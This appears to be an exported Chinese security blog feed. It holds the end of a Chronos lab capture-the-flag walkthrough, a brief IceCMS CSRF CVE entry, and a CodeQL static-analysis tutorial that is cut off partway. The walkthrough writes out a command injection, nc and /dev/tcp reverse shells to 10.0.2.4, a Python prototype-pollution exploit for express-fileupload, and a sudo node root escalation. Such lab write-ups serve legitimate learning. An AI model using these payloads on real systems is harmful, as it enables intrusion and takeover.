<p>单独抓取新访问请求查看参数和请求</p>
<img src="/2022/10/29/CHRONOS/11.png" class title="This is an example image">

<p>发现format参数疑似编码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>

<p>cyberchef 自动识别试试</p>
<img src="/2022/10/29/CHRONOS/12.png" class title="This is an example image">

<p>可以看到识别出编码为 Base58 ，解码内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>疑似 linux bash 命令 ，猜测后端应该执行编码指令</p>
<p>尝试编码堆叠注入</p>
<img src="/2022/10/29/CHRONOS/13.png" class title="This is an example image">

<p>存在注入漏洞</p>
<img src="/2022/10/29/CHRONOS/14.png" class title="This is an example image">



<p><strong>0x06 反弹shell &amp; 信息收集</strong></p>
<p>既然有命令注入直接尝试 nc 反弹，经尝试，靶机上的 nc 没有 -e 参数，用 nc 串联的方式反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 | /bin/bash | 10.0.2.4 5555</span><br></pre></td></tr></table></figure>

<img src="/2022/10/29/CHRONOS/15.png" class title="This is an example image">



<p>进行基础的信息收集，当前为普通用户，服务端用node.js搭建</p>
<img src="/2022/10/29/CHRONOS/16.png" class title="This is an example image">



<p>查看 &#x2F;etc&#x2F;passwd 得到 imera 账号有 bash 权限</p>
<img src="/2022/10/29/CHRONOS/17.png" class title="This is an example image">



<p>home 目录下的 imera 目录有 user.txt文件，但只有其自身有权限</p>
<img src="/2022/10/29/CHRONOS/18.png" class title="This is an example image">



<p><strong>0x07 提权 &amp; 提权</strong></p>
<p>现在的思路是提权，提权思路一般有</p>
<ol>
<li>内核提权，uname -a</li>
<li>suid 权限配置不当，通过执行高权限用户文件得到高权限。</li>
<li>sudo 提权</li>
</ol>
<p>暂时没找到可以利用的，默认命令执行的目录为 &#x2F;opt&#x2F;chronos，看到同级目录下还有个 chronos-v2 目录</p>
<p>又是一个 node.js 服务端，那就找找 node.js 框架漏洞吧</p>
<p>网上找到了node.js的代码注入漏洞，原理是参数污染，利用条件为开启了express-fileupload，并且 parseNested 选项为 true</p>
<img src="/2022/10/29/CHRONOS/19.png" class title="This is an example image">

<p>发现刚好满足条件</p>
<p>根据靶机条件修改EXP端口和IP信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.0.2.4/8888 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:7777&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:7777&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>开启 http 服务，把文件上传到靶机，执行反弹 shell</p>
<img src="/2022/10/29/CHRONOS/20.png" class title="This is an example image">

<p>看到反弹了 imera 权限，读取 &#x2F;home&#x2F;imera  的user.txt，这就是个 flag，base64加密，没啥内容。</p>
<img src="/2022/10/29/CHRONOS/21.png" class title="This is an example image">



<p>尝试能否提权到 root</p>
<p>查看拥有 sudo 权限的程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l </span><br></pre></td></tr></table></figure>

<img src="/2022/10/29/CHRONOS/22.png" class title="This is an example image">

<p>可以看到执行 sudo node 无需密码，那提权思路是用 node 创建一个子进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo node -e <span class="string">&#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/10/29/CHRONOS/23.png" class title="This is an example image">

<p>有 root 权限后在对应目录下找到了另外的flag。</p>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE deatail</title>
    <url>/2023/10/27/CVE-deatail/</url>
    <content><![CDATA[<blockquote>
<p>[Suggested description]<br>IceCMS v2.0.1 is vulnerable to Cross Site Request Forgery (CSRF).</p>
<hr>
<p>[Vulnerability Type]<br>Cross Site Request Forgery (CSRF)</p>
<hr>
<p>[Vendor of Product]<br><a href="https://github.com/Thecosy/IceCMS">https://github.com/Thecosy/IceCMS</a></p>
<hr>
<p>[Affected Product Code Base]<br>IceCMS - v2.0.1</p>
<hr>
<p>[Affected Component]<br>After the administrator open the following page and click the the Submit request, cause the CSRF vulnerability.(exp : <a href="https://github.com/Thecosy/IceCMS/issues/17">https://github.com/Thecosy/IceCMS/issues/17</a>)</p>
<hr>
<p>[Root cause]<br>The request header does not have csrftoken added.</p>
</blockquote>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
  </entry>
  <entry>
    <title>CodeQL从入门到入土</title>
    <url>/2023/09/24/CodeQL/</url>
    <content><![CDATA[<h1 id="为什么在现在写这文章"><a href="#为什么在现在写这文章" class="headerlink" title="为什么在现在写这文章"></a>为什么在现在写这文章</h1><p>CodeQL传闻找到了Log4j的漏洞，这段时间上边要求，把公司系统内部常见的问题用CodeQL写检测脚本，用于系统长期检测。主要是记录这段时间的学习，以及自己总结的常用写法。</p>
<p>一个需求，不同人写出来的脚本可能完全不同，各种内置库用法多样，表达式和参数等各种类型之间的转换也很麻烦，本文会提供案例一步一步从分析需求一步一步走下去。</p>
<h1 id="CodeQL是什么"><a href="#CodeQL是什么" class="headerlink" title="CodeQL是什么"></a>CodeQL是什么</h1><p>如果你已经了解CodeQL是什么，可以直接跳过这个章节。</p>
<p>当谈及代码分析和漏洞检测工具时，CodeQL无疑是一款备受推崇的解决方案。作为一种革命性的<strong>语义代码查询语言</strong>，CodeQL在软件安全领域展现出了卓越的实力。</p>
<p>语义分析的特点是，<strong>搜索规则能在一定程度上理解代码上下文</strong>，内置的数据流判断十分强大，也可以自行补充各种例外场景。最基础的脚本需要定义，source(输入源)，sink(污染点)，比如检测SSRF漏洞，source为外部用户输入，sink为创建URL链接的点，可能是new URL()，也可能是其他的不在默认库里的，可自行添加。</p>
<p>CodeQL是由GitHub开发的一种强大的静态代码分析工具。它基于高级数据流分析技术，可深入理解代码结构、语义和行为。这意味着CodeQL能够超越传统的基于规则或模式匹配的静态分析方法，更全面地检测代码中潜在的安全风险和缺陷。</p>
<p>它提供了一个灵活的查询语言，使开发者能够针对不同编程语言和框架编写自定义的代码查询。通过CodeQL，开发者可以发现诸如内存泄漏、空指针引用、SQL注入等常见的漏洞，并及时修复这些问题，从而提高代码的质量和安全性。</p>
<p>与其他工具相比，CodeQL具有独特的优势。首先，它不仅仅是一个工具，而是一个完整的静态分析平台，提供了丰富的<strong>内置库和查询示例</strong>，帮助开发者快速上手。其次，CodeQL支持多种编程语言，包括C、C++、Java、Python等，使其适用于各种项目和团队。此外，CodeQL还具备可扩展性，可以根据具体需求进行定制和扩展，以应对不同项目的特殊需求。</p>
<h1 id="CodeQL安装"><a href="#CodeQL安装" class="headerlink" title="CodeQL安装"></a>CodeQL安装</h1><p>CodeQL本身包含两部分解析引擎+SDK。</p>
<p>1、官方规则库，各种内置的ql脚本，这部分是开源的</p>
<p>地址：<a href="https://github.com/github/codeql">https://github.com/github/codeql</a></p>
<img src="/2023/09/24/CodeQL/01.png" class title="This is an example image">

<p>默认推荐将路径添加进path环境变量（多个版本另外说）。</p>
<img src="/2023/09/24/CodeQL/02.png" class title="This is an example image">

<p>命令行运行codeql -v，输出结果说明安装成功。</p>
<p>2、数据库编译引擎，不开源，只有二进制执行文件。将源代码转换为CodeQL脚本能识别的抽象语法树。</p>
<p>地址：<a href="https://github.com/github/codeql-cli-binaries">https://github.com/github/codeql-cli-binaries</a></p>
<p>下面以java为例，利用codeql引擎对java代码进行编译，在pom文件目录执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">codeql database create java-database --language=java --command=&quot;mvn clean install -Dmaven.test.skip=true --settings 路径/setting.xml&quot;</span><br></pre></td></tr></table></figure>

<p>源码目录会生成 java-database目录，打开看看里面有src.zip文件才算编译成功。</p>
<p>因此，编写一个最简单的CodeQL脚本，需要代码中指定SDK路径，编写代码后用解析引擎运行。</p>
<h2 id><a href="#" class="headerlink" title></a></h2><p>编译中的注意点：</p>
<p>1、源码目录不能有中文</p>
<p>2、网络问题导致编译错误，比如公司内部网络可能要加证书啥的</p>
<h1 id="CodeQL基本语法-amp-常用语法总结"><a href="#CodeQL基本语法-amp-常用语法总结" class="headerlink" title="CodeQL基本语法&amp;常用语法总结"></a>CodeQL基本语法&amp;常用语法总结</h1><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>CodeQL的查询语法有点像SQL语法，基本结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &lt;language&gt; /*导入对应的语言包*/</span><br><span class="line">from [datatype] vat /*构建数据类型表，便于理解可以认为是声明变量*/</span><br><span class="line">where condition[var = something] /*设置逻辑表达式*/</span><br><span class="line">select var /*打印结果*/</span><br></pre></td></tr></table></figure>

<p>其实就三个步骤，<strong>定义数据类型，设置条件，进行查询</strong>。</p>
<h3 id="谓词"><a href="#谓词" class="headerlink" title="谓词"></a>谓词</h3><p>在CodeQL中谓词可以说是最常见的概念，叫做 Predicates，可以理解为类似函数。PS：谓词首字母要小写。</p>
<p>谓词也分为有返回词和无返回词（下面有例子）</p>
<p>先说无返回值的，个人比较常用。</p>
<p>个人拙见说下<strong>无返回值谓词</strong>的作用。CodeQL的查询大概是这么个流程，定义一张大的数据表，然后根据脚本一步一步缩小数据表的内容，同时构建各种数据之间的关系，最后把满足条件的数据查询出来。那谓词的作用，就是用来缩小数据范围，也就是做限定。最简单的例子，定义一张整数类型的数据表，然后限制数据只能在1-10之间，这就是无返回值谓词的作用，<strong>用于限定数据集</strong>。</p>
<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">predicate isList(Parameter p)&#123;                      //声明谓词，入参为参数类型</span><br><span class="line">	p.getType().toString().indexOf(&quot;List&lt;&quot;) != -1   //要求参数的类型有List字样</span><br><span class="line">&#125;                                                   //所以这个谓词的作用是，限制入参是List类型</span><br><span class="line"></span><br><span class="line">class Vul extends TaintTracking::Configuration&#123;</span><br><span class="line">	override predicate isSource(DataFlow::Node source)&#123;</span><br><span class="line">		exists(</span><br><span class="line">        	Parameter p | isList(p)                 //无返回值谓词，通常用于限制，常配合exists使用</span><br><span class="line">            and p = source.asParameter()            //存在参数p，满足谓词isList的限制</span><br><span class="line">        )</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有返回值的谓词。</p>
<p>其实就是类似函数，没有 predicate关键词，多了一个特征词 result，result的值就是这个谓词的返回结果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int test(int i)&#123;</span><br><span class="line">	result = i + 1</span><br><span class="line">	and i in [1..19]</span><br><span class="line">&#125;</span><br><span class="line">select test(3)  //输出4</span><br></pre></td></tr></table></figure>

<p>大概是这样的形式，等用到的时候再多试试。</p>
<p>CodeQL的写法是很灵活的。举个例子，打印1到10之间的数字。</p>
<p>用类的写法是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">class Mynum extends int&#123;</span><br><span class="line">	Mynum()&#123;</span><br><span class="line">		this in [1..10]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">from int i</span><br><span class="line">where i instanceof Mynum</span><br><span class="line">select i</span><br></pre></td></tr></table></figure>

<p>用无返回值谓词写法是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">predicate myNum(int i)&#123;</span><br><span class="line">	i in [1..10]</span><br><span class="line">&#125;</span><br><span class="line">from int i</span><br><span class="line">where myNum(i)</span><br><span class="line">select i</span><br></pre></td></tr></table></figure>

<p>用返回值谓词的写法是这样:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">int myNum(int i)&#123;</span><br><span class="line">	result = i</span><br><span class="line">	and i in [1..10]</span><br><span class="line">&#125;</span><br><span class="line">from int i</span><br><span class="line">select myNum(i)</span><br></pre></td></tr></table></figure>

<p>这几种写法结果是一样的</p>
<h3 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h3><p>CodeQL里面的类不是建立一个对象，更类似建立一个数据集，类型取决于继承的类，基本可以继承任意类，包括boolean、float、int、string等基本类型。举个例子，定义Mybatis的xml文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class MyBatisMapperXmlFile extends XmlFile&#123;                //继承XmlFile，定义为一个xml文件</span><br><span class="line">	MyBatisMapperXmlFile()&#123;                                //定义是一个怎么样的xml文件</span><br><span class="line">    	count(XmlElement e | e = this.getAChild()) = 1 and //要求xml文件有&lt;mappeer&gt;节点</span><br><span class="line">    	this.getAChild().getName() = &quot;mapper&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class MyBatisMapperXmlElement extends XmlElement&#123;           //定义为一个xml元素</span><br><span class="line">	MyBatisMapperXmlElement()&#123;							 //定义是怎么样的xml元素</span><br><span class="line">		this.getFile() instanceof MyBatisMapperXmlFile     //定义xml元素属于MyBatisMapperXmlFile</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><p>就是类调用自己，通常用在嵌套场景。比如类成员变量里还有类，多层嵌套。</p>
<p>+和*的含义如下：</p>
<p>parentOf+(p)，表示对变量p应用一次或多次谓词parentOf，等价于ancestorOf(p)。</p>
<p>parentOf*(p)，表示对变量p应用零次或多次谓词parentOf，要么返回p的祖先，要么是变量p自身。</p>
<p>示例：</p>
<p>比如已经定义了parentOf()，用于求出某个人的父母，那么可以借助其定义childof:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Person childOf(Person p)&#123;</span><br><span class="line">	P = parentOf(result)</span><br><span class="line">&#125;</span><br><span class="line">// 在此基本上可以定义祖先</span><br><span class="line">Person ancestorOf(Person p)&#123;</span><br><span class="line">	result = parentOf(p) or</span><br><span class="line">	result = parentOf(ancestorOf(P))</span><br><span class="line">&#125;</span><br><span class="line">//  再定义亲属</span><br><span class="line">Person relativeOf(Person p)&#123;</span><br><span class="line">	parentOf*(result) = parentOf*(p)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这部分有点抽象，看不懂没关系，后续有案例</p>
<h2 id="常见语法总结"><a href="#常见语法总结" class="headerlink" title="常见语法总结"></a>常见语法总结</h2><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Method</td>
<td>方法类，获取当前项目中所有的方法，获取的是<strong>方法声明</strong></td>
</tr>
<tr>
<td>MethodAccess(老2.13.1)</td>
<td>方法调用类，获取所有的方法<strong>实际调用</strong>，比如List.add()，add就是方法调用</td>
</tr>
<tr>
<td>MethodCall(老2.13.1)</td>
<td>方法调用类，获取所有的方法<strong>实际调用</strong>，比如List.add()，add就是方法调用</td>
</tr>
<tr>
<td>Parameter</td>
<td>参数类，Parameter表示获取当前项目当中<strong>所有的参数</strong></td>
</tr>
<tr>
<td>Annotation</td>
<td>注解类，获取所有注解，一般用于判断特定注解或获取切面路由</td>
</tr>
<tr>
<td>Expr</td>
<td>表达式类，所有的<strong>有值、有类型</strong>统称为表达式，能跟各种类型互相转换</td>
</tr>
<tr>
<td>XmlFile</td>
<td>XML文件，很多项目都用得到，比如mybatis的$占位符</td>
</tr>
</tbody></table>
<p>那么每个类怎么去看有什么方法呢？</p>
<p>1、直接看官网文档，关键词搜，<a href="https://codeql.github.com/codeql-standard-libraries/java/index.html#E">https://codeql.github.com/codeql-standard-libraries/java/index.html#E</a></p>
<p>2、直接看依赖库源代码的说明</p>
<p>两者内容基本一样，但前者比较方便查询。</p>
<img src="/2023/09/24/CodeQL/03.png" class title="This is an example image">

<img src="/2023/09/24/CodeQL/04.png" class title="This is an example image">

<p>这够直观了吧。列举几个常用的，如果看文档看没看到就找份实际跑下：</p>
<table>
<thead>
<tr>
<th>MethodCall方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>getAnArgument</td>
<td>获取方法调用的所有参数</td>
</tr>
<tr>
<td>getArgument</td>
<td>获取指定参数，比如getArgument(0)获取第一个参数</td>
</tr>
<tr>
<td>getEnclosingCallable</td>
<td>获取包含此调用方法的类或是方法</td>
</tr>
<tr>
<td>getMethod</td>
<td>获取方法的实现，MethodCall是方法的调用</td>
</tr>
<tr>
<td>getQualifier</td>
<td>获取方法调用的主体，即谁调用的</td>
</tr>
</tbody></table>
<p>这里吐个槽，CodeQL更新还是比较快的，真的有点佛，这就导致了很多问题，用最新版的话，很多以前的参考代码运行不了，而且每次更新最要命的是，很多类直接就删了或是改名字，不是简单的增加或删除几个谓词，是直接类名就改了，我水平低还没看出改名字的必要性。</p>
<p>之前让ChatGPT根据需求简单写个QL脚本，根本运行不了，很多语法都变了。写这文章的时候才发现不久前写的脚本一些类(MethodAccess)在官方文档找不到了，原来是改了名字(MethodCall)。</p>
<h3 id="不同版本CodeQL切换的注意点"><a href="#不同版本CodeQL切换的注意点" class="headerlink" title="不同版本CodeQL切换的注意点"></a>不同版本CodeQL切换的注意点</h3><p><strong>用于生成database的codeql.exe版本和codeql规则代码版本需要保持一致</strong></p>
<p>1、新建个文件夹，放最新的codeql-cli，和codeql的依赖库</p>
<p>2、用最新你的codeql-cli去编译数据库</p>
<p>3、vscode里QL插件的设置要改，要重新配置codeql-cli的路径(没改是执行不了最新语法的)</p>
<h3 id="继承-amp-实现"><a href="#继承-amp-实现" class="headerlink" title="继承&amp;实现"></a>继承&amp;实现</h3><p>在CodeQL中看源码经常有种写法，定义一个抽象类，然后由其他类去继承。</p>
<p>而代码中用 instanceof 判断的是抽象类，<strong>实际上判断都是所有继承抽象类的其他类的限制</strong>。</p>
<p>比如输入流，RemoteFlowSource，这是系统内置用来获取外部输入流的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 定义抽象类原创输入流</span><br><span class="line">abstract class RemoteFlowSource extends DataFlow::Node &#123;</span><br><span class="line">  abstract string getSourceType();</span><br><span class="line">&#125;</span><br><span class="line">// 继承抽象类，限制为外部输入流</span><br><span class="line">private class ExternalRemoteFlowSource extends RemoteFlowSource &#123;</span><br><span class="line">  ExternalRemoteFlowSource() &#123; sourceNode(this, &quot;remote&quot;) &#125;</span><br><span class="line"></span><br><span class="line">  override string getSourceType() &#123; result = &quot;external&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 继承抽象类，限制为RMI类型的输入</span><br><span class="line">private class RmiMethodParameterSource extends RemoteFlowSource &#123;</span><br><span class="line">  RmiMethodParameterSource() &#123;</span><br><span class="line">    exists(RemoteCallableMethod method |</span><br><span class="line">      method.getAParameter() = this.asParameter() and</span><br><span class="line">      (</span><br><span class="line">        this.getType() instanceof PrimitiveType or</span><br><span class="line">        this.getType() instanceof TypeString</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">  override string getSourceType() &#123; result = &quot;RMI method parameter&quot; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大多都直接限制所有类为外部输入流，也可以额外自己补充特定输入流。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">override predite isSource(DataFlow::Node source)&#123; source instanceof RemoteFlowSource&#125;</span><br></pre></td></tr></table></figure>



<h3 id="污点追踪"><a href="#污点追踪" class="headerlink" title="污点追踪"></a>污点追踪</h3><p>什么是source和sink？代码自动化审计的污点分析中，最核心的三元组概念，就是（source、sink、sanitizer）。</p>
<p>source是指漏洞污染链条的输入点，比如外部可控变量，入参等，就是非常明显的source。</p>
<p>sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exesql，或是其他自定义封装的)</p>
<p>sanitizer又叫净化函数，是指在整个漏洞链条当中，如果存在一个方法阻断了整个传播链，就叫sanitizer。</p>
<p>再补充一个isAdditionalTaintStep，用于强制把两个节点关联，比如节点A是污染点，节点B是节点业务特性需求点，实际上也是污染点，但CodeQL内部的数据流关联没把这两个点关联，导致节点B没被识别为污染点。这时候就能用isAdditionalTaintStep强制关联两个节点了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class TestVul extends TaintTracking::Configuration&#123;</span><br><span class="line">	TestVul()&#123;</span><br><span class="line">		this = &quot;Test&quot;</span><br><span class="line">	&#125;</span><br><span class="line">	predicae isTaintedString(Expr expSrc, Expr expDest)&#123;</span><br><span class="line">		// 想要强制关联的两个表达式的关系</span><br><span class="line">	&#125;</span><br><span class="line">	override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2)&#123;</span><br><span class="line">		isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">	&#125;</span><br><span class="line">	override predicate isSource(DataFlow::Node Source)&#123;</span><br><span class="line">		// source.asParameter</span><br><span class="line">		// source.asExpr</span><br><span class="line">	&#125;</span><br><span class="line">	override predicate isSink(DataFlow::Node sink)&#123;</span><br><span class="line">		// sink.asParameter</span><br><span class="line">		// sink.asExpr</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="CodeQL常用句式"><a href="#CodeQL常用句式" class="headerlink" title="CodeQL常用句式"></a>CodeQL常用句式</h1><p>这部分是个人比较常用的，以后会持续补充，做个记录，便于查询。</p>
<p>先谈点CodeQL脚本的编写思路，四个字<strong>由内到外</strong>，比如编写一个检测 mybatis $ 占位符的脚本，而且要关联到 java 代码的数据流，不是简单地检测所有相关 mapper xml文件有无$字符。因此需要梳理相关数据流，其中比较关键的是，怎么让 xml 对应的方法和 java 代码的方法相关联。</p>
<p>具体分析下需求，最习惯的思路是，获取所有的数据流，判断所有相关的方法是否有进行数据库操作，再获取相关的 mapper xml 文件，一步一步正向获取，但这种思维来写CodeQL非常容易卡壳。实际上写法是由内到外，先判断所有相关 mappe xml文件，再去找对应的方法，判断数据流，<strong>就是把小的数据先搜索到再对比是否属于那个大的目标</strong>。</p>
<h2 id="java代码和xml文件关联"><a href="#java代码和xml文件关联" class="headerlink" title="java代码和xml文件关联"></a>java代码和xml文件关联</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// java代码和xml文件关联</span><br><span class="line">// codeql-main\java\ql\src\semmle\code\xml\MyBatisMapperXML.qll</span><br><span class="line">class MyBatisMapperSqlOperationWithProgram extends MyBatisMapperXmlElement&#123;</span><br><span class="line">	MyBatisMapperSqlOperationWithProgram()&#123;</span><br><span class="line">		this instanceof MybatisMapperSqlOperation // xml 文件是数据库相关的</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	// 根据xml文件中的update、detele、select、insert元素找到对应的java方法</span><br><span class="line">	// &lt;select id=&quot;findStuCount&quot; resultType=&quot;java.lang.Integer&quot;&gt;</span><br><span class="line">	Method getMethod()&#123;</span><br><span class="line">		result.getName() = this.getAttribute(&quot;id&quot;).getValue() and // 获取id指定的方法</span><br><span class="line">		result.getDeclaringType() = this.getParent().(MyBatisMapperXmlElement).getNamespaceRefType()</span><br><span class="line">		// getDeclaringType 获取抽象类的接口声明</span><br><span class="line">		// getNamespaceRefType 获取mapper文件中对应的方法</span><br><span class="line">		// &lt;mapper namespace=&quot;com.ttice.icewkment.mapper.ArticleClassMapper&quot;&gt;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="获取指定注解"><a href="#获取指定注解" class="headerlink" title="获取指定注解"></a>获取指定注解</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">class PostAnn extends Annotation&#123;</span><br><span class="line">	PostAnn()&#123;</span><br><span class="line">this.getType().hasQualifiedName(&quot;org.springbootframework.web.bind.annotation&quot;,&quot;PostMapping&quot;)</span><br><span class="line">		// 指定注解类包名，注解类名</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="获取指定方法"><a href="#获取指定方法" class="headerlink" title="获取指定方法"></a>获取指定方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">class JalorProgramCheckMethod extends Method&#123;</span><br><span class="line">	JalorProgramCheckMethod()&#123;</span><br><span class="line">		this.hasQualifiedName(&quot;com.ttice.icewkment.service&quot;,&quot;ArticleService&quot;,&quot;GetList&quot;)</span><br><span class="line">		// 指定包名、类名、方法名</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="显示源码位置"><a href="#显示源码位置" class="headerlink" title="显示源码位置"></a>显示源码位置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from Call c, Method m</span><br><span class="line">where m = c.getCallee() and</span><br><span class="line">	m.hasName(&quot;insert&quot;)</span><br><span class="line">select c,c.getLocation.getFile().getRelativePath()+&quot;:&quot;+c.getLocation().getStartLine(),c.getCaller()</span><br></pre></td></tr></table></figure>



<h2 id="查询某个类型的变量"><a href="#查询某个类型的变量" class="headerlink" title="查询某个类型的变量"></a>查询某个类型的变量</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from Variable v, PrimitiveType pt</span><br><span class="line">where pt = v.getType() and</span><br><span class="line">	pt.hasName(&quot;int&quot;)</span><br><span class="line">select v,v.getLocation()</span><br></pre></td></tr></table></figure>



<h2 id="查询类，成员参数有集合类型"><a href="#查询类，成员参数有集合类型" class="headerlink" title="查询类，成员参数有集合类型"></a>查询类，成员参数有集合类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.Collections</span><br><span class="line">// 定义一个字段，字段是Collections类型</span><br><span class="line">class Listfield extends Field&#123;</span><br><span class="line">	Listfield()&#123;</span><br><span class="line">		// CollectionType 是 java.util.Collection 参数化的引用类型</span><br><span class="line">		this.getType() instanceof CollectionType</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">// 带有list字段的类</span><br><span class="line">class ClassWithList extends Class&#123;</span><br><span class="line">	ClassWithList()&#123;</span><br><span class="line">		// 类中有List字段，或者继承的类有list，或者字段类有list</span><br><span class="line">		exists(Field f | this.getAField() = f and f instanceof Listfield) or </span><br><span class="line">		exists(ClassWithList svo | this.getAnAncestor = svo) or </span><br><span class="line">		exists(Field f, ClassWithList svo | this.getAField() = f and f.getType()=svo)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">from Class c</span><br><span class="line">where c instanceof ClassWithList</span><br><span class="line">select c</span><br></pre></td></tr></table></figure>

<p>上面这些组装来组装去也差不多，实在找不到的话去看看官方文档。</p>
<h1 id="CodeQL手把手实操"><a href="#CodeQL手把手实操" class="headerlink" title="CodeQL手把手实操"></a>CodeQL手把手实操</h1><p>由上面可知，CodeQL是强项在于，<strong>你十分了解漏洞或是不规范代码的写法，并且中间还要有数据流向的判断</strong>，不然直接用IDEA全局搜不也挺方便，CodeQL还要编译。</p>
<p>所以这里就选了个非常清晰的小需求。批量操作场景下的参数个数检测，分析需求如下：</p>
<p>1、任意入参可当作 source，因为中间可能有字符串分割，比如通过逗号分隔成 List类型</p>
<p>2、最终是要进行数据库操作（增删查改），这里假定源码是springboot框架，数据库操作用的是mybatis，设定的场景是集合类型入参（有一种场景是String入参，在mybatis进行分割查询，这类型先不讨论）</p>
<p>3、需要分析入参跟最后数据库操作的数据流，并分析是否有@size注解</p>
<p>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Dos</span><br><span class="line"> * @description Dos</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity recommendation</span><br><span class="line"> * @tags security</span><br><span class="line"> */</span><br><span class="line"> import java</span><br><span class="line"> import semmle.code.java.dataflow.FlowSources</span><br><span class="line"> import DataFlow::PathGraph</span><br><span class="line"> // 去除set方法</span><br><span class="line"> class NoSetClass extends Parameter&#123;</span><br><span class="line">    NoSetClass()&#123;</span><br><span class="line">        not(</span><br><span class="line">            this.getCallable().getReturnType().toString() = &quot;void&quot;</span><br><span class="line">            and this.getCallable().toString().matches(&quot;set%&quot;)</span><br><span class="line">            and this.getCallable().getNumberOfParameters() = 1 </span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> // 获取参数，要求没有注解或是有注解但注解不是Size</span><br><span class="line"> class NoAnnOrnotAn extends Parameter&#123;</span><br><span class="line">    NoAnnOrnotAn()&#123;</span><br><span class="line">        exists(</span><br><span class="line">            Annotation an | not 